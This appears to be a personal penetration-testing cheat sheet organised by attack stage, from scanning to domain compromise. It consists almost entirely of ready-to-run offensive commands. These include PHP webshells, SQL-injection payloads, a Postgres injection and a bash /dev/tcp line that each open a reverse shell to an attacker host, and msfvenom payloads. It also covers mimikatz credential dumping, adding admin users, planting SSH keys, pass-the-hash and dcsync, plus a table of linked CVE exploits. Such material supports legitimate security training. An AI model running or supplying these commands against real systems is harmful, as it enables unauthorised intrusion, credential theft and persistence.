# STAGE 1 - RECONNAISSANCE
## Ping sweep
	ip a
List interfaces  

	nmap -sn 123.123.123.0/24
Host discovery  

## General portscan
	nmap -p- --min-rate=1000 -T4 -oN output.txt 123.123.123.123
Flags: All ports, rapid, aggressive, results to output.txt  
Reduce T value or skip min-rate for unstable/slow networks  

	nmap -Pn -sT 123.123.123.123
Flags: Skip ping, basic TCP scan  

	nmap -g53 123.123.123.123
Flags: Source port 53 (may bypass some filtering rules)  

## Versioning portscan
	nmap -p 100,200 -sC -sV -oN output-version.txt 123.123.123.123
Flags: Ports 100,200, NSE script, check version, results to output.txt  

## UDP portscan
UDP is a pain to portscan because a response is not obligatory  

	nmap -sUV -F 123.123.123.123
Flags: Scan udp, check version, only check most common 100 UDP ports  
Open: response obtained. Open|Filtered: unknown.  

	udpx -t 123.123.123.123 -c 128 -w 1000
Flags: 128 concurrent checks, timeout after 1000 ms  

## Exploit Search
    searchsploit "service-version"

## nmap-less
	nc -nv -w 1 -z 123.123.123.123 100-150
unix netcat portscan on ports 100 to 150  

	150..200 | ForEach-Object {Test-NetConnection 123.123.123.123 -Port $_ -WarningAction SilentlyContinue} | Where-Object {$_.TcpTestSucceeded}
powershell portscan on ports 100 to 150  

## SMB recon
	sudo nbtscan -r 123.123.123.0/24
list NetBIOS name  

# STAGE 2 - INITIAL ACCESS
## Netcat Shell Catching
	nc -lvnp 5000
Flags: listen mode, verbose, no DNS, on port 5000  
Victim machine must be configured to send a shell to the attacker on this port  

	https://www.revshells.com/
.  

## Webservers
### Webscan
	sudo nmap -sV --script http-enum -p 80,443 123.123.123.123
Enum with nmap  

	nikto -h http://123.123.123.123
Basic webscan  

	sudo nano /etc/nikto.conf
To use nikto with cookies  

### Fingerprinting
	nikto -h http://123.123.123.123 -Tuning b
Software identification only  

	curl -I http://123.123.123.123
Header only  

### Directory Enumeration
	gobuster dir -u http://123.123.123.123 -w directory-list-2.3-small.txt -e .php,.txt,.bak,.config,.py -o gobuster-output.txt
Flags: Use directory namelist, find extensions, save results  

	ffuf -u http://targeturl.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404
Directory fuzz, filter responses codes 403 & 404  

	ffuf -u http://targeturl.com -H "Host: FUZZ.targeturl.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
Virtual host fuzz, filter responses to 3 words  

	ffuf -u http://FUZZ.targeturl.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
Subdomain fuzz  

	ffuf -u http://targeturl.com/FUZZ -w /wordlist.txt -b "PHPSESSID=33ptqlqcbf3odc4a9e0l1qa65d"
Fuzz with cookie  

	curl -H "Content-Type: application/json" -d "abc" http://123.123.123.123
POST request with json type  

	/robots.txt
	/sitemap.xml
.  

### Wordpress plugin scan
	wpscan --url http://123.123.123.123
Check wordpress and plugin versions for CVEs.  

### Webshells
	<?php echo system("whoami"); ?>
PHP webshell  

	<?php echo system($_GET['cmd']); ?>
parameter webshell: `http://URL/vulnerable.php?cmd=whoami` or `http://URL/index.php?page=vulnerable&cmd=whoami`  

	http://URL/vulnerable.php?page=data://test/plain,<?php$20echo%20system('whoami');?>
data wrapper  

	http://URL/vulnerable.php?page=data://test/plain,base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=whoami"
base64 encoded data wrapper  

### LFI/PHP wrappers
	http://url.com/index.php?file=
On a php webserver with a valid URL parameter,  

|Wrapper|Purpose|
|---|---|
|`php://filter/convert.base64-encode/resource=FILE`|Shows source code of FILE (extensions may be auto-attached depending on `index.php`)|
|`zip:///pathtoZIP#filename`|Unzips and runs `filename.php`|
[OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)  


### Magic hashes
PHP Loose comparison with magic hashes (0e...)  
Set inputs to 0  

### URL Path traversal
	curl --path-as-is http://123.123.123.123/../../../../../etc/passwd
`--path-as-is` is required as curl will squash `../` by default  

### WebDAV
If WebDAV is present from nmap scan,  

	cadaver http://123.123.123.123
Use to upload/copy/move files

	move shell.txt shell.asp;.txt
If `.asp` files cannot be directly uploaded, use `move` or `copy` to bypass filters  

## LDAP
	ldapsearch -x -H ldap://192.168.150.122 -b "dc=domain,dc=com"
Anonymous LDAP query  

	ldapsearch -x -H ldap://192.168.150.122 -D "CN=USERNAME,CN=Users,DC=domain,DC=com" -w 'PASSWORD' -b "dc=domain,dc=com"
Auth'd LDAP query  

	ldapsearch -x -H ldap://192.168.150.122 -D "CN=USERNAME,CN=Users,DC=domain,DC=com" -w 'PASSWORD' -b "dc=domain,dc=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
Query admin password from LAPS  

## Injections
### Commands injections
	...; id #
Include # to comment out code behind  

### MySQL Blind
	INJECTION and if (1=1,sleep(3),'false')

### MSSQL Blind
	INJECTION;waitfor delay '0:0:3';

### Postgres Blind
	INJECTION;select pg_sleep(3)--

## SQL info extraction
### list db
	select schema_name from information_schema.schemata
if dbo is listed, server is MSSQL. use `select name from sys.databases` instead  

### list tables mysql
	select table_name from information_schema.tables where table_schema='db'

### list tables mssql
	select table_name from db.information_schema.tables

### list columns mysql
	select column_name, data_type from information_schema.columns where table_schema='db' and table_name='table'
to reference a table, use `db.table`  

### list tables mssql
	select column_name, data_type from db.information_schema.columns where table_name='table'
to reference a table, use `db.dbo.table`  

### postgresql error output
	INJECTION'; DO $$ BEGIN RAISE EXCEPTION '%', (SELECT string_agg(datname, ', ') FROM pg_database);END; $$;-- - 
if site only shows output on error, use this to run queries and output it as error. String_agg concats all rows

## SQL to shell
### mssql
	EXECUTE sp_configure 'show advanced options', 1;
	RECONFIGURE;
	EXECUTE sp_configure 'xp_cmdshell', 1;
	RECONFIGURE;
	EXECUTE xp_cmdshell 'whoami';

### mysql
	INJECTION' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/tmp/webshell.php"; -- - 
Disk location must be writable. Find a way to execute the php file  

### postgres
	'; COPY (SELECT '') to program 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 123.123.123.1 4444 >/tmp/f';-- - 

## SQL Misc
### mssqlpwner
	mssqlpwner domain/user:password@123.123.123.123 interactive
Flags: Connect to SQL server in interactive shell  

	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
Flags: Execute direct query, impersonate as appdev, dump users table  

### mysql non-interactive query
	mysql -u 'root' --password='' -D database -e "SHOW DATABASES"

### nxc
	nxc mssql 123.123.123.123 -u user -p password --rid-brute > rid-output.txt
Flags: Domain username RID bruteforce, save results  

## Password Cracking
### MD5 Rainbow Table
If the hash contains 32-char hex,  

    https://crackstation.net/

### NTLM Rainbow Table
	https://ntlm.pw

### Hash bruteforce
	hashcat -m 10000 hash.txt passlist.txt
Flags: Use module 10000, crack hash.txt, use passlist.txt  

### hydra
	hydra -l user -P passlist.txt ssh://123.123.123.123:22
password guess. Use `-L userlist.txt and -p password` for password spray  

	hydra -l username -P passlist.txt 123.123.123.123 http-post-form "/login.php:userparameter=^USER^&passparameter=^PASS^:Login failed!"
post login with specific parameters. `Login failed!` is the failure string

### SSH Private key decrypt
	ssh2john id_rsa > pkey.hash
	john --wordlist=rockyou.txt pkey.hash
If passphrase was requested when private key was used  

## Compromised User Access
### SSH
	ssh user@123.123.123.123
with input password  

	ssh -i rsa.file -p 10000 user@123.123.123.123
with rsa private key, over port 10000  

### SSH - overwrite internal pub key
	echo "ssh-rsa .... kali@kali" >> /home/user/.ssh/authorized_keys
`/root/.ssh/authorized_keys` for root pubkey  

### WinRM
	evil-winrm -i 123.123.123.123 -u username -p password

### nxc
	nxc <proto> 123.123.123.123 --port 8000 -u <filename|name> -p <filename|name> --continue-on-success
Bruteforce usernames and passwords via the protocol on port 8000  
Add `--no-brute-force` with userfile and passfile to iterate user1:pass1, user2:pass2, etc.  

### SMB
	smbclient -L //123.123.123.123 -U username%password
List shares  

	impacket-psexec username:password@123.123.123.123
Use `\` to escape special characters in password. Requires admin  

### MSSQL login
	impacket-mssqlclient user:password@123.123.123.123 -windows-auth
windows-auth uses NTLM  

### MySQL login
	mysql -u user -p'pass' -h 123.123.123.123 -P 3306 --skip-ssl-verify-server-cert

### Pass the Hash
	smbclient //123.123.123.123/share -U Administrator --pw-nt-hash <hash>

	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
if `LM hash` is unused, do `:<NT hash>`. Same format for `impacket-wmiexec`. Alternatively, add 32 0s for LM Hash.  

# STAGE 3 - PRIVILEGE ESCALATION
## Weakness Enumeration (Linpeas/Winpeas)
From attacker, `cd` to directory of enumerator  

    python3 -m http.server 80
Host python webserver containing enumerator for victim  

### From victim,
### Linpeas
	curl -o linpeas.sh 10.10.10.10/linpeas.sh
Download the enumerator from your webserver  
  
	sh linpeas.sh > linpeas-output.txt
Run the script and save results  
### Winpeas
	Invoke-WebRequest -Uri 'http://10.10.10.10/WinPEASx64.exe' -OutFile '.\winpeas.exe'
Download the enumerator from your webserver  
Wrap in `powershell -c "Invoke-Web..."` if needed  

	./winpeas.exe > winpeas-output.txt
Run the script and save results  

## File hijacking
	msfvenom -p windows/powershell_reverse_tcp LPORT=9001 LHOST=123.123.123.1 -f exe > binary.exe
`msfvenom -l payloads` and `msfvenom -l formats` for more types  

	msfvenom -p windows/adduser USER=username PASS=Password123! -f exe > binary.exe
Adhere to password requirements  

## Windows - file transfer
	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
Convert file into clipboard contents  

	[IO.File]::WriteAllBytes("C:\filename", [Convert]::FromBase64String("base64string"))
Write clipboard into file  

	certutil -urlcache -f http://10.10.10.10/winPEAS.bat winpeas.bat
If no curl or powershell  

## Windows - directory
	tree /f
.  

	dir /s/a/q/n

## Windows - user check
	Get-LocalUser | ForEach-Object { $u = $_; [PSCustomObject]@{ User = $u.Name; Groups = (Get-LocalGroup | Where-Object { (Get-LocalGroupMember $_ -ErrorAction SilentlyContinue).Name -match [regex]::Escape($u.Name) }).Name -join ', ' } }
List all users and their groups  

## Windows - search
	Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.rtf,*.log -File -Recurse -ErrorAction SilentlyContinue
Search for any file with .kdbx extension  

## Windows - check env
	systeminfo
.  

	whoami /all
.  

	net users
.  

	set
.  

	tasklist /svc

## Windows - kernel exploits
[Precompiled binaries](https://github.com/SecWiki/windows-kernel-exploits)  

To compile, use `mingw-w64`  

	x86_64-w64-mingw32-gcc -o output.exe source.c
64 bit compilation, C code  

	i686-w64-mingw32-gcc -o output32.exe source.c
32 bit compilation, C code  

	x86_64-w64-mingw32-gcc -shared -o output.dll source.c
64 bit compilation, DLL file  

	x86_64-w64-mingw32-gcc -o exploit.exe exploit.c -lws2_32
Compilation with winsock  

	x86_64-w64-mingw32-g++ -o app.exe app.cpp
Compilation for C++  

## Windows - services
	sc \\localhost query state= all| findstr SERVICE_NAME
List all services  

	sc qc servicename
Queryconfig service  

	for /f "tokens=2 delims=: " %s in ('sc query state^= all ^| findstr "SERVICE_NAME"') do @(for /f "delims=" %t in ('sc qc "%s" ^| findstr "BINARY_PATH_NAME"') do @echo %s && echo %t)
Show all binary paths  

	Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.PathName -notlike "*system32\svchost*"}
List all services and binary paths, omit svchost  

For most replaced services, they cannot be started due to lack of privileges, so initiate `shutdown /r /t 0`  

## Windows - open ports
	netstat -ano

## Windows - registry
	reg query "HKLM\software\microsoft\windows\currentversion\run" /s
List startup programs  

	reg query "HKLM\software\microsoft\windows\currentversion\runonce" /s
List one-time startup programs  

## Windows - permissions
	icacls filename.ext
Look for F, W, M access  

	icacls . /t /c
List access recursively  

	icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*"

## Windows - mimikatz
	privilege::debug
	sekurlsa::logonpasswords
View logon passwords  

	token::elevate
	lsadump::sam
	lsadump::secrets
LSADump  

	https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file

## Windows - Potatoes (SeImpersonatePrivilege/SeAssignPrimaryToken)
Transfer some kind of Potato to target machine  

	./SigmaPotato.exe whoami
Win8 - Win11/2012/2016/2019/2022  

	./juicypotato.exe -l <port> -p cmd -t * -c {CLSID}
Win7 - Win10/2008R2/2012/2016  
Check CLSIDs [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)  

	./printspoofer.exe -i -c cmd
Win10/2016/2019  

	./SweetPotato.exe -p cmd -e [DCOM|WinRM|EfsRpc|PrintSpoofer]
	Invoke-SweetPotato -Binary 'C:/Windows/System32/cmd.exe'
Win7 - Win10/2019  

## Windows - SeBackupPrivilege
	reg save hklm\sam sam.hive
	reg save hklm\system system.hive
Dump hives, transfer to kali  

	impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Dump hashes and `hashcat -m 1000`  

## Windows - powershell history
	type $((Get-PSReadlineOption).HistorySavePath)
File is usually `Appdata/roaming/microsoft/windows/Powershell/PSreadline/consolehost_history.txt`  

	Get-History
Finds current shell history  

## Windows - powershell scriptblock logging
Event ID 4104 in App-Log>Microsoft/Windows/Powershell/Operational.  

## Windows - impersonate token
	https://www.offsec.com/metasploit-unleashed/fun-incognito/

## Windows - ExecutionPolicy
	Set-ExecutionPolicy Bypass -Scope Process -Force

## Windows - add new admin user
	net user "Username" "Password" /add
	net localgroup administrators "Username" /add

## Windows - enable RDP
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
powershell  

	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
cmd  

## Windows - Create Schtask and invoke
	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
	Invoke-Command -Computer COMPUTERNAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\path\to\shell.exe /ru SYSTEM } -Credential $credential
	Invoke-Command -Computer COMPUTERNAME -ScriptBlock { schtasks /run /tn shell } -Credential $credential

## Linux - file transfer
	cat filename | base64 -w 0;echo
Convert file into clipboard contents  

	echo -n 'base64code' | base64 -d > filename
Save clipboard into file  

	nc -l -p 8000 --recv-only > filename
Save nc contents on port 8000 into filename  

	nc --send-only 123.123.123.123 8000 < filename
Send filename contents into target port 8000 over nc  

## Linux - directory
	tree
.  

	ls -lah ./*

## Linux - check powers
	id
	sudo -l
Check for [weird groups](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html)  

## Linux - check system
	cat /etc/os-release 2>/dev/null
	uname -a

## Linux - services
	ps aux | grep root
List root-running services  

	ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
List services binary path  

## Linux - open ports
	ss -tulnp

## Linux - cronjobs
	ls -lah /etc/cron*
	cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/* /etc/incron.d/* /var/spool/incron/* 2>/dev/null
linpeas check  

	crontab -l
`crontab -l` will list current user cronjobs only  

	grep "CRON" /var/log/syslog
if crontab is not accessible, check logs  

	./pspy32
Run and look for any recurrent processes by UID 0  

## Linux - installed programs
	dpkg -l
`rpm` for red-hat devices  

## Linux - permissions
	find / -perm -4000 -type f 2>/dev/null
List SUID files  

	find / -perm -2000 -type f 2>/dev/null
List GUID files  

	find / -perm -2 -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null
List world-writable files  

	find / -writable -type d 2>/dev/null
	find / -writable -type f 2>/dev/null
List writable files and directories  

	/usr/sbin/getcap -r / 2>/dev/null
Look for capabilities  

## Linux - writable passwd
	'name:passhash:0:0::/root:'
Generate passhash with `openssl passwd <password>`  

## Linux - wildcards
	/usr/bin/binary *.php
Create a new file in the working directory to insert flags for malicious use. [hacktricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html)  

## Linux - binaries
	gtfobins.org

## Linux - SUID make
Create a `Makefile` with desired bash commands e.g.  

	Makefile:

	action:
		chmod u+s /bin/bash
Then run `sudo make action` on the directory containing the `Makefile`.  
Change `action` to whatever if necessary.  

## Linux - .so (shared object) injection
	strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
Check if SUID binary attempts to read .so file that can be injected  

	#include <stdio.h>
	#include <stdlib.h>
	void inject(){
    	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
	}
Create a .c file  

	gcc -shared -o <so filename> -fPIC <c filename>
Compile the .so and inject it  

## Linux - history
	history
.  

	cat ~/.bash_history

## Linux - env
	env
	cat .bashrc

## Linux - keyword search
	grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)' ./

## Linux - mail search
	find / -path '*mail*' -type f 2>/dev/null

## Linux - SSH permissions
	cat /etc/ssh/sshd_config
`AllowUsers` dictate who can SSH  

## AD - Powerview
	Get-NetGroup
	Get-NetUser
	Get-NetComputer
	Find-LocalAdminAccess

## AD - Check LAPS
	Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
Use powerview to see if LAPS are enabled for any machines  

	Find-AdmPwdExtendedRights -Identity * | fl
See who can see LAPS  

## AD - GenericWrite/GenericAll
1. Set account to no-preauth, asrep roast, crack hash  
1. Set SPN for account, kerberoast, crack hash  

## AD - GPO GenericWrite
1. `\\dc1\sysvol\domain.com\Policies\{policyID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl`  
1. Find SID of Domain Admins and target user  
1. add the following  
`[Group Membership]`  
`*S-1-5-32-544__Memberof =`  
`*S-1-5-32-544__Members = *S-1-5-21-3453094141-4163309614-2941200192-1104`  
1. Then increment GPT.ini in `{policyID}`, `gpupdate /force`, relog  

## AD - No preauth ASREP
	./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat
Crack with mode 18200  

	impacket-GetNPUsers -dc-ip 123.123.123.123 -request -outputfile hashes.txt domain.com/user
Kali version  

## AD - Kerberoasting TGSREP
	./Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
Crack with mode 13100

	impacket-GetUserSPNs -dc-ip 123.123.123.123 -request -outputfile hashes.txt domain.com/user
Kali version  

## AD - silver
	kerberos::golden /sid:<domain-sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<spn hash> /user:username
in mimikatz  

## AD - dcsync
	lsadump::dcsync /user:corp\dave
in mimikatz  

	impacket-secretsdump -just-dc-user targetuser corp.com/user:"password"@123.123.123.123
from Kali  

# STAGE 3.5 - PIVOT
## Windows - port forwarding
	netsh interface portproxy add v4tov4 listenport=8000 listenaddress=LISTENIP connectport=7000 connectaddress=CONNECTIP

## Linux - port forwarding
	ssh -L 8000:10.10.1.1:7000 user@123.123.123.123
SSH tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
Execute on attacker machine  
Localhost/123.123.123.1 <--> 123.123.123.123/10.10.10.10 <--> 10.10.1.1  
Afterwards, connect to localhost:8000 to access  

	rm /tmp/p;mkfifo /tmp/p;nc -lvnp 8000 < /tmp/p | nc 10.10.1.1 7000 > /tmp/p
NC tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
Afterwards, connect to 123.123.123.123:8000 to access  

	sysctl net.ipv4.ip_forward
	sudo sysctl -w net.ipv4.ip_forward
Check if iptables forwarding is enabled  

	sudo iptables -t nat -A PREROUTING -i eth0 -o tcp -d LISTENIP --dport 8000 -j DNAT --to-destination CONNECTIP:7000
	sudo iptables -t nat -A POSTROUTING -i eth1 -o tcp -d CONNECTIP --dport 7000 -j SNAT --to-source LISTENIP2
Set pre and post routes, iptables  

## SSH + proxychains
	ssh -D 9050 remoteuser@123.123.123.123
Set a SSH forward on localhost 9050  

	tail /etc/proxychains.conf
Ensure there is a line `socks4 127.0.0.1 9050`

	sudo proxychains nmap -v -Pn -sT INTERNALIP
proxychain nmap portscan on one host  

	proxychains xfreerdp /v:INTERNALIP /u:username /p:password
proxychain rdp connect  

## Net-NTLMv2 hash catching
	impacket-smbserver -ip <host-ip> TMP /tmp -smb2support -debug -outputfile outfile.txt
Host an smb server to catch smb credentials. Hashes will be found in `./outfile.txt`  

	dir \\<host-ip>\tmp
From target machine, initiate an smb connection.  
Alternatively, force machine to initiate an smb connection with web uploads i.e. filename `//<host-ip>/tmp`  

## Net-NTLM relay
	impacket-ntlmrelayx --no-http-server -smb2support -t 123.123.123.130 -c <command>
listen for smb connections and relay them to 123.123.123.130 and execute command there  

# STAGE 4 - LATERAL MOVEMENT
## CMD wmi
	wmic /node:123.123.123.123 /user:user /password:password process call create "powershell -e ..."
Bypasses account lockout restrictions  

## Powershell CimSession
	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
	$options = New-CimSessionOption -Protocol DCOM
	$session = New-CimSession -ComputerName 123.123.123.123 -Credential $credential -SessionOption $options
	$command = 'powershell -e ...'
	Invoke-CimMethod -CimSession $Session -ClassName -Win32_Process -MethodName Create -Arguments @{CommandLine=$command}

## winrs
	winrs -r:hostname -u:username -p:password "powershell -e ..."
requires Admin/Remote Management User on target

## PSSession
	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
	$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString
	New-PSSession -ComputerName 123.123.123.123 -Credential $credential
	Enter-PSSession <no.>

## Windows PsExec
	.\PsExec.exe -i \\hostname -u username -p password "powershell"
requires admin on target  

## Pass the hash
	impacket-psexec -hashes <LM hash>:<NT hash> Administrator@123.123.123.123
using an NTLM hash, authenticate as the user  

## Over pass the hash (NTLM to kerberos upgrade)
	sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlmhash> /run:powershell
using an NTLM hash, obtain a kerberos ticket for the user.  
new powershell will have mismatched whoami. run net use or net view to retrieve tickets and PsExec into another machine  

## Pass the ticket
	sekurlsa::tickets /export
	kerberos::ptt <ticketname>
retrieve and obtain an existing ticket of another user on the local machine  

## DCOM
	$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","123.123.123.123"))
	$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-e ...","7")

## krbtgt dump
	lsadump::lsa /patch
dumps krbtgt hash from domain controller  

# APPENDIX
## Kali built-in wordlists
### Passwords
	cd /usr/share/wordlists/rockyou.txt.gz
	gzip -d rockyou.txt.gz
Flags: Extract the list from .gz  

### Directories
	/usr/share/wordlists/dirbuster
	/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
Directories  

	/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
Extensions  

	/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Subdomains  

	/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
GET/POST parameters  

## Seclists
	sudo apt install seclists
	/usr/share/seclists/

## assetnote.io
	https://wordlists.assetnote.io/

## HTTP headers
	(POST|GET|PUT) / HTTP/1.1
	Content-Type: application/x-www-form-urlencoded
	Content-Type: application/json
	Authorization: Bearer <token>
	Authorization: Basic <token>
	Authorization: OAuth <token>
	Cookie: $Version=1; Skin=new;
	Host: en.wikipedia.org
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
  
## Vulnerabilities
|Software|Version|CVE|Link|Remarks|
|---|---|---|---|---|
|Docker Desktop for Windows|4.44.2|CVE-2025-9074|[CVE-2025-9074-PoC](https://github.com/BridgerAlderson/CVE-2025-9074-PoC)||
|Cacti|1.2.29|CVE-2025-24367|[CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)||
|pkexec||CVE-2021-4034|[pwnkit](https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures)|pkexec SUID, gcc present on target|
|vsftpd|2.3.4|CVE-2011-2523|[Exploitdb](https://www.exploit-db.com/exploits/49757)||
|Apache|2.4.49|CVE-2021-41773|see url path traversal||
|Grafana|8.3.0 and more|CVE-2021-43798|[grafana-cve-2021-43798](https://www.vulncheck.com/blog/grafana-cve-2021-43798)||
|Perfect Survey (Wordpress)|<1.5.2|CVE-2021-24762|[metasploit-module](https://github.com/aaryan-11-x/My-Metasploit-Modules/blob/main/CVE-2021-24762%3A%20WordPress%20Plugin%20Perfect%20Survey%201.5.1%20-%20SQLi%20(Unauthenticated)/wp_perfect_survey_sqli.rb)||
|FileZilla|3.63.1|CVE-2023-53959|Generate `TextShaping.dll` and place in app folder||
|Saltstack||CVE-2020-11651|[CVE-2020-11651-poc](https://github.com/jasperla/CVE-2020-11651-poc)|Ports 4505,4506,8000|
|Subrion|<=4.2.1|CVE-2023-46947|[github issue](https://github.com/intelliants/subrion/issues/909)|Default creds - admin,admin|
|Exiftool-DjVu|7.44 - 12.23|CVE-2021-22204|[CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)|Check with `exiftool -ver`|
|Exhibitor/Zookeeper|1.7.1|CVE-2019-5029|[exploitDB](https://www.exploit-db.com/exploits/48654)|Blind command inj.|
|Grav|<1.10.7|CVE-2021-21425|[github](https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py)|Unauth YAML config overwrite|
|Redis|<=5.0.5|???|[github](https://github.com/n0b0dyCN/redis-rogue-server/tree/master)|Shell|
|FreeSWITCH|1.10.1||[exploitDB](https://www.exploit-db.com/exploits/47799)||
|Cassandra Web|0.5.0||[exploitDB](https://www.exploit-db.com/exploits/49362)|`curl --path-as-is http://ip:3000/../../../../../../../../etc/passwd`|
|FuguHub|8.4|CVE-2024-27697|[github](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)|Use lua one-liner in revshells|
|ImageMagick|6.9.6-4|CVE-2023-34152|[github](https://github.com/SudoIndividual/CVE-2023-34152)|Shell will bind upon upload|
|Lavarel|<=8.4.2|CVE-2021-3129|[github](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)|clone phpggc package to create phar, edit endpoint leading `/` if needed|
|rpc.py|<=0.6.0|CVE-2022-35411|[github](https://github.com/CSpanias/rpc-rce.py)||
|Flatpress|<1.3|CVE-2022-40048|[github issue](https://github.com/flatpressblog/flatpress/issues/152)||
|JetBrains/TeamCity|<=2023.11.3|CVE-2024-27198|[rapid7](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)|Use curl command|
|pdfkit|<=0.8.7.2|CVE-2022-25765|[exploitdb](https://www.exploit-db.com/exploits/51293)|Point to the POST endpoint|
|wp-advanced-search|<3.3.9.2|CVE-2024-9796|[wpscan](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/)|Use PoC SQL injection|
|PyLoad|0.5.0|CVE-2023-0297|[exploitdb](https://www.exploit-db.com/exploits/51532)|First check if `/flash/addcrypted2` endpoint is available|
|PHP SPX||CVE-2024-42007|[github issue](https://github.com/NoiseByNorthwest/php-spx/issues/251)|Replace SPX_KEY with server SPX key|
|SmarterMail|6985|CVE-2019-7214|[exploitdb](https://www.exploit-db.com/exploits/49216)|.NET remoting service port open|
|Windows TaskSch||CVE-2010-3338|[exploitdb](https://www.exploit-db.com/exploits/15589)|Run `cscript file.wsf`. New creds created: `test123:test123`|
|LibreOffice||CVE-2023-2255|[github](https://github.com/elweth-sec/CVE-2023-2255)|If the odt file is opened with LibreOffice, execution achieved|
|H2 Database||CVE-2021-42392|[github](https://github.com/Be-Innova/CVE-2021-42392-exploit-lab/blob/main/client/h2_exploit.py)|RCE direct from sql query|
|H2 Database|||[exploitdb](https://www.exploit-db.com/exploits/49384)|JNI RCE if javac is missing|
|PaperStream|1.42.0.5685|CVE-2018-16156|[exploitdb](https://www.exploit-db.com/exploits/49382)|Payload required may be 32bit|
|HP Power Manager||CVE-2009-2685|[github](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py)|Replace buf with your own msfvenom payload|


## Run new shell
	/bin/sh -i 0<&3 1>&3 2>&3
.  

	/bin/bash -c "/bin/bash -i >& /dev/tcp/<kali-ip>/9001 0>&1"

## Linux AppArmor check
	aa-status
Enforce mode profiles and processes will block privesc attempts.  


## Quote escapes
	curl -H 'Custom-Header: <?php echo system($_GET['\''cmd'\'']); ?>'
Use `''` to escape all other special characters. Close quote and `\'` and reopen to include one single quote  

For double quotes, `$`, `` ` ``, `"`, `\`, `!` must be escaped with backslash.  

## Python venv
	python -m venv venv
	source venv/bin/activate
	pip install <packages>
Create virtual env. for custom python packages  

	deactivate
cleanup  

## JuicyPotato 32 bit
For old [machines](https://github.com/ivanitlearning/Juicy-Potato-x86)  